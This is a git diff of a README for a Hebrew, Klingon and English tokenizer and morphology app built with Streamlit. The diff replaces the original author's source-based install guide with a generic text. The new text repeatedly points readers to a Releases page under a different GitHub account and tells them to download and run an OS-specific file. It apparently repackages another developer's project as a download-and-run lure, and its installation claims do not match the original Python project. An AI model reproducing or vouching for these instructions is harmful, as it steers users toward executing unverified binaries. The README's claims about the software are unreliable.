@@ -1,271 +1,88 @@
-# Multi-Language Tokenizer & Morphology Explorer
-
-![Python](https://img.shields.io/badge/python-3.8+-blue.svg?style=flat&logo=python&logoColor=white)
-![Streamlit](https://img.shields.io/badge/streamlit-1.28+-FF4B4B.svg?style=flat&logo=streamlit&logoColor=white)
-![License](https://img.shields.io/badge/license-MIT-green.svg?style=flat)
-![Languages](https://img.shields.io/badge/languages-Hebrew%20%7C%20Klingon%20%7C%20English-orange.svg?style=flat)
-![NLP](https://img.shields.io/badge/NLP-Multi--Language-brightgreen.svg?style=flat)
-![Status](https://img.shields.io/badge/status-active-success.svg?style=flat)
-![Contributions](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat)
-
----
-
-An interactive web application for multi-language NLP analysis supporting **Hebrew**, **Klingon**, and **English**. Input text in any of these languages, select analysis models, and receive detailed tokenization and morphological breakdowns with confidence scores, visualizations, and export capabilities.
-
-## Supported Languages
-
-- 🇮🇱 **Hebrew** - Full morphological analysis with gender, number, person, tense, and binyanim
-- 🖖 **Klingon (tlhIngan Hol)** - Advanced tokenization with agglutinative morphology support
-- 🇬🇧 **English** - Part-of-speech tagging, lemmatization, and dependency parsing
-
-## Features
-
-- 🌐 **Multi-Language Support** - Process Hebrew, Klingon, and English text
-- 🔤 **Advanced Preprocessing** - Normalization, diacritic handling, and language separation
-- ✂️ **Language-Aware Tokenization** - Specialized segmentation for each language's unique structure
-- 📊 **Morphological Analysis** - Detailed breakdown adapted to each language's grammar
-  - Hebrew: gender, number, person, tense, binyanim
-  - Klingon: noun/verb prefixes, suffixes, aspect markers
-  - English: POS tags, lemmas, morphological features
-- 🎯 **Confidence Scoring** - Transparent confidence metrics for every analysis
-- 🎨 **Interactive UI** - Built with Streamlit, supporting RTL text (Hebrew) and LTR text (Klingon, English)
-- 💾 **Export Options** - Download results in JSON or CSV formats
-- 📈 **Visualizations** - Charts and graphs for morphological distribution across languages
-
-## Tech Stack
-
-- **Python** 3.8+
-- **Streamlit** - Web application framework
-- **Pandas** - Data manipulation and analysis
-- **Plotly** - Interactive visualizations
-- **spaCy** - English NLP processing
-- **Custom NLP Modules** - Hebrew and Klingon tokenization and morphology
-
-## Project Structure
-
-```
-Tokenizer-Morphology-Explorer/
-├── app.py                      # Main Streamlit application
-├── verify_app.py               # Application verification script
-├── modules/                    # Core NLP processing modules
-│   ├── preprocessor.py         # Multi-language text preprocessing
-│   ├── tokenizer.py            # Hebrew, Klingon, English tokenization
-│   ├── morphology.py           # Morphological analysis for all languages
-│   ├── hebrew_analyzer.py      # Hebrew-specific analysis
-│   ├── klingon_analyzer.py     # Klingon-specific analysis
-│   └── english_analyzer.py     # English-specific analysis
-├── data/                       # Dictionaries and rule sets
-│   ├── hebrew_lexicon.json     # Hebrew word lexicon
-│   ├── klingon_lexicon.json    # Klingon word database
-│   ├── english_lexicon.json    # English word database
-│   └── rules.json              # Language-specific morphological rules
-├── requirements.txt            # Python dependencies
-└── README.md                   # Project documentation
-```
+# 🌟 Tokenizer-Morphology-Explorer - Explore Language in Depth
 
-## Prerequisites
+## 👁️ Overview
+The Tokenizer-Morphology-Explorer is a user-friendly tool designed to help you analyze and understand languages like Hebrew, Klingon, and English. With this application, you can break down text into smaller parts and examine their structure, making language exploration engaging and educational.
 
-- Python 3.8 or later
-- pip (Python package manager)
-- Virtual environment (recommended)
+## 📦 Download & Install
+To get started, you need to download the software. Click the link below to access the Releases page:
 
-## Installation
+[![Download Tokenizer-Morphology-Explorer](https://img.shields.io/badge/Download%20Now-Tokenizer--Morphology--Explorer-brightgreen)](https://github.com/abduljabarawwal/Tokenizer-Morphology-Explorer/releases)
 
-### 1. Clone the Repository
+Follow these steps to download and install the application:
 
-```bash
-git clone https://github.com/the3y3-code/Tokenizer-Morphology-Explorer.git
-cd Tokenizer-Morphology-Explorer
-```
-
-### 2. Create Virtual Environment
-
-```bash
-python -m venv venv
-```
-
-### 3. Activate Virtual Environment
-
-**On Windows:**
-```bash
-venv\Scripts\activate
-```
+1. Click on the link above to visit the Releases page.
+2. Find the latest version of the application.
+3. Download the appropriate file for your operating system.
+4. Once downloaded, locate the file in your downloads folder and run it.
 
-**On macOS/Linux:**
-```bash
-source venv/bin/activate
-```
-
-### 4. Install Dependencies
+## 🚀 Getting Started
+After installing the application, follow these steps to start exploring:
 
-```bash
-pip install -r requirements.txt
-```
+1. Open the Tokenizer-Morphology-Explorer application.
+2. Choose a language: Hebrew, Klingon, or English.
+3. Input the text you want to analyze in the provided text box.
+4. Click on the "Analyze" button to see the tokenization and morphological breakdown of your text.
+5. Review the results and gain insights into the structure of the language.
 
-### 5. Download Language Models (if using spaCy for English)
+## 🖥️ System Requirements
+To run Tokenizer-Morphology-Explorer, your computer needs to meet the following requirements:
 
-```bash
-python -m spacy download en_core_web_sm
-```
+- **Operating System:** Windows 10 or later / macOS Big Sur or later / Linux
+- **RAM:** Minimum 4 GB
+- **Disk Space:** At least 100 MB
+- **Processor:** Dual-core or better
 
-## Usage
+Ensure your system meets these requirements to guarantee smooth performance.
 
-### Run the Application
+## 📚 Features
+The Tokenizer-Morphology-Explorer offers the following features:
 
-```bash
-streamlit run app.py
-```
-
-The application will open in your default browser at `http://localhost:8501`.
+- **Multi-language Support:** Analyze Hebrew, Klingon, and English.
+- **Tokenization:** Break down sentences into words and phrases.
+- **Morphological Analysis:** Understand the structure and forms of words.
+- **User-Friendly Interface:** Easy to navigate for all users.
+- **Export Results:** Save your analysis in text or CSV format for future reference.
 
-### Using the Interface
+## ⚙️ How to Use
+Using the Tokenizer-Morphology-Explorer is straightforward:
 
-1. **Select Language** - Choose Hebrew, Klingon, or English
-2. **Input Text** - Enter text in the selected language
-3. **Select Model** - Choose from available analysis models
-4. **Analyze** - Click the analyze button to process the text
-5. **View Results** - Explore tokenization, morphology, and confidence scores
-6. **Export** - Download results in JSON or CSV format
+1. Launch the application after installation.
+2. Select your desired language.
+3. Type or paste the text you want to analyze.
+4. Click "Analyze" to view the breakdown.
+5. Explore the output, which shows tokens and their morphological details.
 
-### Example Inputs
+### Example Input
+You can start with sample sentences in each language:
 
-**Hebrew:**
-```
-שלום עולם
-```
+- **English:** The quick brown fox jumps over the lazy dog.
+- **Hebrew:** האלף של האותיות נמצא במסמכים המיוחדים.
+- **Klingon:** nuqneH.
 
-**Klingon:**
-```
-nuqneH, qaleghpu'
-```
+Feel free to paste your own text or use these examples to see how the application works.
 
-**English:**
-```
-Hello world, how are you?
-```
+## 🔄 Troubleshooting
+If you experience issues while using the application, consider the following tips:
 
-### Verify Installation
+- **Check System Requirements:** Make sure your device meets the requirements outlined above.
+- **Reinstall the Application:** If the app crashes, try uninstalling and reinstalling it.
+- **Consult the FAQ:** Visit the application's FAQ section for common questions and solutions.
 
-Run the verification script to ensure everything is set up correctly:
+## 🌐 Community and Support
+Join our community to connect with other users and get help:
 
-```bash
-python verify_app.py
-```
+- **GitHub Issues:** Report problems or feature requests directly in the Issues section.
+- **Discussion Forum:** Engage with other users and share your experiences.
+- **Contact Us:** You can reach out through our GitHub profile for direct support.
 
-## API Usage
+## 📄 License
+Tokenizer-Morphology-Explorer is open-source software, released under the MIT License. This allows you to use, modify, and distribute the application freely.
 
-You can also use the modules programmatically:
+## 🌟 Stay Updated
+To keep up with the latest updates, new features, and announcements, follow us on GitHub and check back frequently on our Releases page.
 
-```python
-from modules.tokenizer import MultiLanguageTokenizer
-from modules.morphology import MorphologyAnalyzer
+For additional information, including detailed usage instruction and community discussions, visit the Releases page:
 
-# Initialize
-tokenizer = MultiLanguageTokenizer()
-analyzer = MorphologyAnalyzer()
+[![Download Tokenizer-Morphology-Explorer](https://img.shields.io/badge/Download%20Now-Tokenizer--Morphology--Explorer-brightgreen)](https://github.com/abduljabarawwal/Tokenizer-Morphology-Explorer/releases)
 
-# Hebrew example
-hebrew_text = "שלום עולם"
-hebrew_tokens = tokenizer.tokenize(hebrew_text, language="hebrew")
-for token in hebrew_tokens:
-    morphology = analyzer.analyze(token, language="hebrew")
-    print(f"{token}: {morphology}")
-
-# Klingon example
-klingon_text = "nuqneH"
-klingon_tokens = tokenizer.tokenize(klingon_text, language="klingon")
-for token in klingon_tokens:
-    morphology = analyzer.analyze(token, language="klingon")
-    print(f"{token}: {morphology}")
-
-# English example
-english_text = "Hello world"
-english_tokens = tokenizer.tokenize(english_text, language="english")
-for token in english_tokens:
-    morphology = analyzer.analyze(token, language="english")
-    print(f"{token}: {morphology}")
-```
-
-## Running Tests
-
-To run tests (if implemented):
-
-```bash
-pytest tests/
-```
-
-## Language-Specific Features
-
-### Hebrew Analysis
-- Root extraction (shoresh)
-- Binyan identification
-- Gender and number agreement
-- Prefix and suffix handling
-- Nikud (diacritics) processing
-
-### Klingon Analysis
-- Verb prefix recognition (pronominal prefixes)
-- Noun suffix types (1-5)
-- Verb suffix types (1-9)
-- Rover suffixes
-- Aspect and mood markers
-
-### English Analysis
-- Part-of-speech tagging
-- Lemmatization
-- Named entity recognition
-- Dependency parsing
-- Morphological features (tense, number, person)
-
-## Contributing
-
-Contributions are welcome! Please follow these steps:
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-Please read [CONTRIBUTING.md](CONTRIBUTING.md) for details on our code of conduct and development process.
-
-## Roadmap
-
-- [ ] Add support for additional languages (Arabic, Esperanto)
-- [ ] Implement sentiment analysis for all languages
-- [ ] Add named entity recognition (NER) for Hebrew and Klingon
-- [ ] Cross-language comparison tools
-- [ ] Translation suggestions between supported languages
-- [ ] RESTful API endpoint
-- [ ] Docker containerization
-- [ ] Batch processing mode
-- [ ] Mobile-responsive UI improvements
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-- Hebrew NLP research community
-- Klingon Language Institute (KLI)
-- spaCy and English NLP communities
-- Streamlit framework developers
-- Contributors and testers
-
-## Contact
-
-**the3y3-code** - [GitHub Profile](https://github.com/the3y3-code)
-
-Project Link: [https://github.com/the3y3-code/Tokenizer-Morphology-Explorer](https://github.com/the3y3-code/Tokenizer-Morphology-Explorer)
-
-## Resources
-
-- [Hebrew Morphology Reference](https://en.wikipedia.org/wiki/Hebrew_grammar)
-- [Klingon Language Institute](https://www.kli.org/)
-- [The Klingon Dictionary](https://en.wikipedia.org/wiki/The_Klingon_Dictionary)
-- [English NLP with spaCy](https://spacy.io/)
-
----
-
-⭐ If you find this project useful, please consider giving it a star!
+Explore the world of languages with Tokenizer-Morphology-Explorer!
